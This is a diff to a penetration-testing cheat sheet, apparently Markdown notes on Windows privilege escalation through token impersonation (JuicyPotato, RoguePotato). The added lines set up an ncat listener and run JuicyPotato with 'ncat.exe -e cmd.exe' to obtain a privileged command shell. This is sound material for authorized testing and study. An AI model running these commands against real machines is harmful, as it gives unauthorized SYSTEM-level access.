@@ -171,7 +171,9 @@ Look for SeImpersonate or SeAssignPrimaryToken
 [CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   
 
      juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
-
+     
+     ncat.exe -l 3333      
+     C:\\JuicyPotato.exe -l 1234 -p c:\\windows\\system32\\cmd.exe -a "/c C:\\ncat.exe -e cmd.exe 127.0.0.1 3333" -t *    #use ncat.exe to get a privileged shell        
 ### Rogue Potato   
 [Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
 [Code](https://github.com/antonioCoco/RoguePotato)  
